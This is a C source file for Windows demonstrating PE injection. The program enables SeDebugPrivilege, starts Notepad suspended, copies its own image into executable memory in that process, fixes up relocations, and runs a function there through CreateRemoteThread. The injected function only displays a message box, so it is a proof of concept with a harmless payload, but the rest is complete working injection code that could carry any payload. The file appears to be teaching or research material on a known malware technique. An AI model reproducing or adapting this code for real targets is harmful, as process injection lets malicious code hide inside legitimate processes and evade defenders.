#include <stdio.h>
#include <windows.h>

// Custom system error printing function
void PrintError(const char* text)
{
    DWORD err = GetLastError();
    LPSTR buf = nullptr;

    FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |       // Allocate a buffer, retrieve from system error message, ignore inserts
        FORMAT_MESSAGE_FROM_SYSTEM |           // Get the message from the system's message table
        FORMAT_MESSAGE_IGNORE_INSERTS,         // Do not include insert sequences in the message
        nullptr,                               // lpSource: Pointer to the source; use nullptr for system messages
        err,                                   // dwMessageId: The error code for which we want the message
        0,                                     // dwLanguageId: Use default language
        (LPSTR)&buf,                           // lpBuffer: Allocate a buffer to receive the formatted message
        0,                                     // nSize: Size of the buffer; 0 to use the allocated size
        nullptr);                              // Arguments: Pointer to additional arguments; nullptr if not needed

    if (buf) // strip trailing CR/LF
    {
        char* p = buf;
        while (*p && (*p != '\r') && (*p != '\n')) ++p;
        *p = '\0';
    }

    printf("%s (0x%lX: %s)\n", text, err, buf ? buf : "<unknown>");    // Print system error code with it's description
    LocalFree(buf);                          // hMem: Pointer to the memory to be freed; frees the allocated buffer from FormatMessage
}

// A custom way to look at the 16-bit entries that appear inside a Windows PE “base-relocation” block
typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12; // The bottom 12 bits are used to describe the offset bytes relative to the image base
    USHORT Type : 4; // 4 bits for relocation type
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

BOOL EnableWindowsPrivilege(const wchar_t* Privilege) {
    HANDLE token;
    TOKEN_PRIVILEGES priv;
    BOOL ret = FALSE;

    if (OpenProcessToken(
        GetCurrentProcess(),                    // ProcessHandle: Handle to the current process (returns the handle to the calling process)
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,  // DesiredAccess: adjusting privileges and querying the token
        &token                                  // TokenHandle: Pointer to a variable that receives the token handle
    )) {
        priv.PrivilegeCount = 1;   // Set the number of privileges to enable
        priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;   // Mark privilege as enabled

        if (LookupPrivilegeValue(
            NULL,                               // lpSystemName: NULL indicates the privilege is local to the current system
            Privilege,                          // lpName: Name of the privilege to look up
            &priv.Privileges[0].Luid            // pluid: Pointer to a LUID structure that receives the locally unique identifier for the specified privilege
        ) != FALSE &&
            AdjustTokenPrivileges(
                token,                          // TokenHandle: Handle to the access token to modify
                FALSE,                          // DisableAllPrivileges: FALSE indicates that we do not want to disable all privileges
                &priv,                          // TokenPrivileges: Pointer to a TOKEN_PRIVILEGES structure that contains the new privilege settings
                0,                              // BufferLength: Set to 0 since we do not need to retrieve previous privileges
                NULL,                           // PreviousPrivileges: Pointer to a buffer that would receive the previous privileges (not used in this case)
                NULL                            // ReturnLength: Pointer to a variable that receives the size of the previous privileges (not used here)
            ) != FALSE) {
            ret = TRUE;
        }

        if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) { // In case privilege is not part of token (e.g. run as non-admin)
            ret = FALSE;
        }

        CloseHandle(token);
    }

    if (ret == TRUE)
        printf("Success\n");
    else
        printf("Failure\n");

    return ret;
}

// Define function pointers for dynamically loaded functions
typedef HANDLE(WINAPI* PFN_GETMODULEHANDLEA)(LPCSTR);
typedef DWORD(WINAPI* PFN_GETLASTERROR)();
typedef VOID(WINAPI* PFN_SLEEP)(DWORD);
typedef HANDLE(WINAPI* PFN_CREATEREMOTETHREAD)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* PFN_GETNATIVESYSTEMINFO)(LPSYSTEM_INFO);
typedef LPVOID(WINAPI* PFN_VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD);
typedef LPVOID(WINAPI* PFN_VIRTUALALLOCEX)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* PFN_WRITEPROCESSMEMORY)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef BOOL(WINAPI* PFN_CREATEPROCESSA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef HANDLE(WINAPI* PFN_OPENPROCESS)(DWORD, BOOL, DWORD);
typedef int(WINAPI* PFN_MESSAGEBOXA)(HWND, LPCSTR, LPCSTR, UINT);

BOOL IsSystem64Bit() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");   // Load kernel32.dll for function usage
    if (!hKernel32) return FALSE;

    // Get the address of GetNativeSystemInfo
    PFN_GETNATIVESYSTEMINFO pGetNativeSystemInfo = (PFN_GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo");
    if (!pGetNativeSystemInfo) {
        FreeLibrary(hKernel32);   // Free library if function not found
        return FALSE;
    }

    BOOL bIsWow64 = FALSE;      // Flag to indicate if the system is running in WOW64 mode
    SYSTEM_INFO si = { 0 };     // Structure to hold system information
    pGetNativeSystemInfo(&si);  // Fill the SYSTEM_INFO structure

    // Check if the processor architecture is AMD64 or IA64
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64) {
        bIsWow64 = TRUE;
    }

    FreeLibrary(hKernel32);   // Free the loaded library
    return bIsWow64;
}

// Entry point for injection
DWORD InjectionEntryPoint() {
    HMODULE hUser32 = LoadLibraryA("user32.dll");   // Load user32.dll to access GUI functions
    if (!hUser32) return 0;

    // Get the address of MessageBoxA function
    PFN_MESSAGEBOXA pMessageBoxA = (PFN_MESSAGEBOXA)GetProcAddress(hUser32, "MessageBoxA");
    if (pMessageBoxA) {
        // Call MessageBoxA to display a message
        pMessageBoxA(
            NULL,                    // hWnd: Handle to the owner window for the message box; NULL indicates no owner
            "Injection Successful",  // lpText: Pointer to the message string to be displayed in the message box
            "PE Injection",          // lpCaption: Pointer to the string displayed in the title bar of the message box
            NULL                     // uType: Specifies the contents and behavior of the message box; NULL indicates default behavior
        );
    }
    FreeLibrary(hUser32);   // Free the loaded library
    return 0;
}


int main()
{
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");   // Load kernel32.dll for process manipulation
    if (!hKernel32) {
        PrintError("Failed to load kernel32.dll\n");
        return 1;
    }

    // Get function addresses for process handling
    PFN_CREATEPROCESSA pCreateProcessA = (PFN_CREATEPROCESSA)GetProcAddress(hKernel32, "CreateProcessA");
    PFN_GETLASTERROR pGetLastError = (PFN_GETLASTERROR)GetProcAddress(hKernel32, "GetLastError");
    PFN_GETMODULEHANDLEA pGetModuleHandleA = (PFN_GETMODULEHANDLEA)GetProcAddress(hKernel32, "GetModuleHandleA");
    PFN_VIRTUALALLOC pVirtualAlloc = (PFN_VIRTUALALLOC)GetProcAddress(hKernel32, "VirtualAlloc");
    PFN_VIRTUALALLOCEX pVirtualAllocEx = (PFN_VIRTUALALLOCEX)GetProcAddress(hKernel32, "VirtualAllocEx");
    PFN_OPENPROCESS pOpenProcess = (PFN_OPENPROCESS)GetProcAddress(hKernel32, "OpenProcess");
    PFN_WRITEPROCESSMEMORY pWriteProcessMemory = (PFN_WRITEPROCESSMEMORY)GetProcAddress(hKernel32, "WriteProcessMemory");
    PFN_CREATEREMOTETHREAD pCreateRemoteThread = (PFN_CREATEREMOTETHREAD)GetProcAddress(hKernel32, "CreateRemoteThread");

    // Attempt to enable SeDebugPrivilege for the current process
    if (!EnableWindowsPrivilege(TEXT("SeDebugPrivilege"))) {
        PrintError("Failed to enable SeDebugPrivilege. You may not have sufficient rights\n");
        return 1;
    }

    // Check if function pointers were successfully retrieved
    if (!pCreateProcessA || !pGetLastError || !pGetModuleHandleA || !pVirtualAlloc || !pVirtualAllocEx || !pOpenProcess || !pWriteProcessMemory || !pCreateRemoteThread) {
        PrintError("Failed to get one or more function addresses\n");
        FreeLibrary(hKernel32);   // Free the loaded library
        return 1;
    }

    // Use relevant Notepad executable based on system architecture 
    char notepadPath[256];   // Buffer to hold the path to Notepad
    if (IsSystem64Bit()) {
        strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\notepad.exe"); // 64-bit Notepad executable
    }
    else {
        strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\SysWOW64\\notepad.exe"); // 32-bit Notepad executable
    }

    // Launch Notepad in a suspended state
    PROCESS_INFORMATION pi;     // Structure to receive process information
    STARTUPINFOA si;            // Structure to specify startup parameters
    memset(&si, 0, sizeof(si)); // Initialize the STARTUPINFOA structure with 0
    si.cb = sizeof(si);         // Set the size of the structure

    // Create a new process for Notepad in a suspended state
    if (!pCreateProcessA(
        NULL,                    // lpApplicationName: Pointer to the name of the module to be executed; NULL indicates the application name is in lpCommandLine
        notepadPath,             // lpCommandLine: Command-line string that contains the application name and any command-line arguments
        NULL,                    // lpProcessAttributes: Pointer to a SECURITY_ATTRIBUTES structure; NULL indicates default security attributes
        NULL,                    // lpThreadAttributes: Pointer to a SECURITY_ATTRIBUTES structure for the thread; NULL indicates default security attributes
        FALSE,                   // bInheritHandles: FALSE indicates the new process does not inherit handles from the calling process
        CREATE_SUSPENDED,        // dwCreationFlags: Flags that control the creation of the process; CREATE_SUSPENDED means the process will start in a suspended state
        NULL,                    // lpEnvironment: Pointer to an environment block for the new process; NULL indicates use the environment of the calling process
        NULL,                    // lpCurrentDirectory: Pointer to the current directory for the new process; NULL indicates use the current directory of the calling process
        &si,                     // lpStartupInfo: Pointer to a STARTUPINFO structure that contains information about how the new process should be started
        &pi                      // lpProcessInformation: Pointer to a PROCESS_INFORMATION structure that receives identification information about the newly created process
    )) {
        PrintError("Failed to launch Notepad\n");
        return 1;
    }

    // Retrieve the handle of the current module
    PVOID imageBase = pGetModuleHandleA(NULL);  // Get the base address of the current module
    if (imageBase != NULL)
    {
        char path[MAX_PATH];     // Buffer to hold the module file name
        if (GetModuleFileNameA(
            (HMODULE)imageBase,  // hModule: Handle to the module (in this case, the base address of the current module) for which to retrieve the file name
            path,                // lpFilename: Pointer to a buffer that receives the module file name
            sizeof(path)         // nSize: Size of the buffer; indicates how much space is available for the file name
        ) != 0) {
            printf("This program is running from: %s\n", path);
        }
    }

    // Create pointers for the DOS header and NT headers of the current process
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;   // Pointer to DOS header
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);   // Pointer to NT headers

    // Allocate memory to hold a copy of the current module's image
    PVOID localImage = pVirtualAlloc(
        NULL,                                       // lpAddress: Pointer to the desired starting address of the region to allocate; NULL means the system chooses the address
        ntHeader->OptionalHeader.SizeOfImage,       // dwSize: Number of bytes to allocate; here it specifies the size of the image from the NT headers
        MEM_RESERVE | MEM_COMMIT,                   // flAllocationType: Combination of flags to reserve and commit the memory
        PAGE_READWRITE                              // flProtect: Protection attribute for the region; PAGE_READWRITE allows read and write access
    );

    // Copy the current module's image to the allocated memory
    memcpy(
        localImage,                                 // dest: Pointer to the destination buffer where data will be copied (allocated memory for the image)
        imageBase,                                  // src: Pointer to the source buffer from which data will be copied (base address of the current module)
        ntHeader->OptionalHeader.SizeOfImage        // count: Number of bytes to copy; specifies the size of the image from the NT headers
    );

    // Open a handle to the target process (Notepad) for manipulation
    HANDLE targetProcess = pOpenProcess(
        MAXIMUM_ALLOWED,                            // dwDesiredAccess: The access level needed; MAXIMUM_ALLOWED grants the highest level of access to the process
        FALSE,                                      // bInheritHandle: FALSE indicates that the handle will not be inherited by child processes
        pi.dwProcessId                              // dwProcessId: The identifier of the target process to open; here it uses the process ID obtained from the PROCESS_INFORMATION structure
    );

    // Allocate memory in the target process for the image
    PVOID targetImage = pVirtualAllocEx(
        targetProcess,                              // hProcess: Handle to the target process where memory will be allocated; this is the process we opened earlier
        NULL,                                       // lpAddress: Pointer to the desired starting address for the allocation; NULL means the system chooses the address
        ntHeader->OptionalHeader.SizeOfImage,       // dwSize: Number of bytes to allocate; this specifies the size of the image from the NT headers
        MEM_RESERVE | MEM_COMMIT,                   // flAllocationType: Combination of flags to reserve and commit the memory in the target process
        PAGE_EXECUTE_READWRITE                      // flProtect: Protection attribute for the allocated region; PAGE_EXECUTE_READWRITE allows execution, reading, and writing
    );

    // Calculate the difference between the target image base and the current image base
    DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;

    // Get the base relocation table from the local image
    PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);  // Total size of the relocation table
    DWORD totalSize = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    DWORD totalProcessed = 0;   // Total amount processed

    // Iterate over the relocation table to adjust addresses for the new base
    while (totalProcessed < (DWORD)totalSize) {
        DWORD blockSize = relocationTable->SizeOfBlock;   // Size of the current relocation block
        DWORD entryCount = (blockSize - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);   // Number of entries in the block
        PBASE_RELOCATION_ENTRY entries = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);   // Pointer to relocation entries

        // Loop through all entries in the current relocation block
        for (DWORD i = 0; i < entryCount; i++) {
            DWORD offset = entries[i].Offset;   // Get the offset from the entry

            // Calculate the target address for relocation using the local image base and the entry's virtual address
            DWORD_PTR relocationTarget = (DWORD_PTR)localImage + relocationTable->VirtualAddress + offset;
            
            // Adjust the value at the relocation target by adding the image base difference (delta) for relocation
            *(DWORD_PTR*)relocationTarget += deltaImageBase;
        }

        // Update the total amount processed with the size of the current relocation block
        totalProcessed += blockSize;
        // Move to the next relocation block in the table
        relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + blockSize);
    }

    // Write the modified image to the target process's memory
    if (!pWriteProcessMemory(
        targetProcess,                                   // hProcess: Handle to the target process where memory will be written; this is the process we opened earlier
        targetImage,                                     // lpBaseAddress: Pointer to the base address in the target process where data will be written
        localImage,                                      // lpBuffer: Pointer to the buffer containing data to be written; this holds the copied image data
        ntHeader->OptionalHeader.SizeOfImage,            // dwSize: Number of bytes to write; here it specifies the size of the image from the NT headers
        NULL                                             // lpNumberOfBytesWritten: Pointer to a variable that receives the size of the data written; NULL means we don't need this information
    )) {
        PrintError("Failed to write to the target process memory\n");
        CloseHandle(targetProcess);   // Close the handle to the target process
        return 1;
    }

    // Calculate the remote address for the function to be executed in the target process
    // This involves adjusting the address of InjectionEntryPoint based on the image base addresses
    DWORD threadId;   // Variable to receive the thread ID of the new thread

    // Create a remote thread in the target process, setting the start address to the adjusted function address
    HANDLE hThread = pCreateRemoteThread(
        targetProcess,                                    // hProcess: Handle to the target process where the thread will be created
        NULL,                                             // lpThreadAttributes: Pointer to a SECURITY_ATTRIBUTES structure; NULL indicates default security
        0,                                                // dwStackSize: Initial stack size for the new thread; 0 means use default size
        (LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint - (DWORD_PTR)imageBase + (DWORD_PTR)targetImage), // lpStartAddress: Pointer to the function to execute
        NULL,                                             // lpParameter: Pointer to a variable to be passed to the thread; NULL means no parameters
        0,                                                // dwCreationFlags: Flags that control the creation of the thread; 0 means no special flags
        &threadId                                         // lpThreadId: Pointer to a variable that receives the thread identifier
    );
    if (!hThread) {
        PrintError("Failed to create a remote thread\n");
        CloseHandle(targetProcess);   // Close the handle to the target process
        return 1;
    }

    CloseHandle(hThread);   // Close the handle to the remote thread as it's no longer needed
    CloseHandle(targetProcess);   // Close the handle to the target process as we're done with it

    FreeLibrary(hKernel32);   // Free the loaded kernel32.dll library to clean up
    return 0;
}